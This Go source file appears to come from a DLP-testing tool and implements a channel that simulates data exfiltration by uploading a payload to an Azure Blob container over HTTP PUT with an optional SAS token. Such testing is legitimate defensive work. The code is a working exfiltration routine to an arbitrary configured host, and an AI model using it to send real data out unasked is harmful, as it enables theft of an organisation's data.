// Package azure implements an Azure Blob Storage exfiltration channel.
// Uses a SAS token URL for unauthenticated upload simulation.
package azure

import (
	"bytes"
	"context"
	"fmt"
	"net/http"
	"time"

	"github.com/hssn-research/dlpbuster/internal/channels"
)

// Channel implements channels.Channel for Azure Blob Storage exfiltration.
type Channel struct{}

// New returns a new Azure Channel.
func New() *Channel { return &Channel{} }

// Name returns the channel identifier.
func (c *Channel) Name() string { return "azure" }

// Description returns a one-line description.
func (c *Channel) Description() string {
	return "Simulate data exfiltration via Azure Blob Storage upload (SAS token)"
}

// Run uploads the payload to a configured Azure Blob container.
func (c *Channel) Run(ctx context.Context, cfg channels.ChannelConfig) channels.Result {
	result := channels.Result{Channel: c.Name()}
	start := time.Now()

	if cfg.AzureAccount == "" || cfg.AzureContainer == "" {
		result.Status = channels.StatusSkipped
		result.Evidence = []string{"azure: account or container not configured"}
		result.Duration = time.Since(start)
		return result
	}

	now := time.Now().UTC()
	blobName := fmt.Sprintf("dlpbuster/%s/payload.bin", now.Format("2006-01-02T15-04-05"))

	// Allow endpoint override for anonymous/public container testing.
	var url string
	if cfg.AzureEndpoint != "" {
		url = fmt.Sprintf("%s/%s/%s", cfg.AzureEndpoint, cfg.AzureContainer, blobName)
	} else {
		url = fmt.Sprintf(
			"https://%s.blob.core.windows.net/%s/%s",
			cfg.AzureAccount, cfg.AzureContainer, blobName,
		)
	}
	if cfg.AzureSASToken != "" {
		url += "?" + cfg.AzureSASToken
	}

	req, err := http.NewRequestWithContext(ctx, http.MethodPut, url, bytes.NewReader(cfg.Payload))
	if err != nil {
		result.Status = channels.StatusError
		result.Error = fmt.Errorf("azure: build request: %w", err)
		result.Duration = time.Since(start)
		return result
	}
	req.Header.Set("x-ms-blob-type", "BlockBlob")
	req.Header.Set("Content-Type", "application/octet-stream")

	client := &http.Client{Timeout: 15 * time.Second}
	resp, err := client.Do(req)
	if err != nil {
		result.Status = channels.StatusBlocked
		result.Evidence = []string{fmt.Sprintf("azure: PUT failed: %v", err)}
		result.Duration = time.Since(start)
		return result
	}
	defer resp.Body.Close()

	evidence := []string{fmt.Sprintf("PUT %s → %d %s", url, resp.StatusCode, http.StatusText(resp.StatusCode))}

	if resp.StatusCode >= 200 && resp.StatusCode < 300 {
		result.Status = channels.StatusPassed
		result.BytesSent = len(cfg.Payload)
	} else {
		result.Status = channels.StatusBlocked
	}
	result.Evidence = evidence
	result.Duration = time.Since(start)
	return result
}
